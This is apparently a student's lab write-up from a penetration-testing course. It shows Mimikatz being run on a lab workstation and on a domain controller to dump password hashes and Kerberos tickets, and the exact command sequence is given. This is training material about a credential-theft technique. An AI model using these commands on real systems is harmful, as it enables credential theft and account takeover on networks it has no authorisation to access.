21.3.3.1

# 21.3.3.1.1. Use Mimikatz to dump all password hashes from the student VM.

Run command prompt as administrator
![196609d62a7cffba4ccf7ff3e8f4eace.png](c2b67839af8c476ba68210fe22b1371e.png)

Allow the app to make changes to your device
![6e9cfc59611da3f55c69cdddbbbd6cfc.png](4ab32245b1324860a580737544a34971.png)

I am logged on as corp/offsec
![218e73bc4e4ada17b2277bf12d78d6e2.png](c366ea24b4b841d488fa2dbc2b705dee.png)

Run mimikatz to dump hashes for all users logged on to the current workstation or server, *including Remote Desktop sessions*.
`mimikatz.exe`
`privilege::debug`
`sekurlsa::logonpasswords`
![b259d19af90f7a5042e9fed7f974da2a.png](b993f02f8d0649178e9821ccb1968b5e.png)
![f6942d7969e7a8c5ce848d3782bc0559.png](21fee5c9887a4a4cbfc4d52ba57cdd3f.png)
![7b155af0b13f8604a0d2869ad291f520.png](9a90cc9a82cb40ba8823ba2a3d5fafe8.png)

We can also view tickets
`sekurlsa::tickets`
![d47dc0f80e5de62d32b8c4d22b455455.png](0c6928b8148749919d38edc12013ab1a.png)
![1430dc98e187cddeb01b585b4f8810ae.png](e2dfd3e4df3540019f331edb630e3f25.png)



# 21.3.3.1.2. Log in to the domain controller as the Jeff_Admin account through Remote Desktop and use Mimikatz to dump all password hashes from the server.

From the Windows client, remote desktop to the domain controller
![33478ef40bd0037bed51edd107a44f18.png](eaa992bb2b4241cdae7f28a517046f30.png)

Sign in as corp\jeff_admin
![56c62eef24a2df8e80ebbdcdcc162248.png](123ef9f8e0034eedb77caa8ba0962da8.png)

Run command prompt as administrator
![4f6a16067cb23eadc128130b180cc39c.png](bfcf59f56ce34266a67725d2b5fb5f4e.png)

Allow this app to make changes to your device
![1de348161ceb92683c13d3503e8773c1.png](5d127204529349f1bc1c06016f427a20.png)

`mimikatz.exe`
`privilege::debug`
![83d04e22e9b742fa7588b22310905a15.png](65c5176498b046d1985c2433e4ac4c6f.png)
`sekurlsa::logonpasswords`
![62ab1c0f504c0f21f35d4fd5531bb76e.png](e1fb12bb49de4c2fafaca7dbeaaf9c71.png)
![30d290cd5a7f06e7edfc6820c5875b98.png](c98d1b83f72540dbb185d31af9ecc823.png)

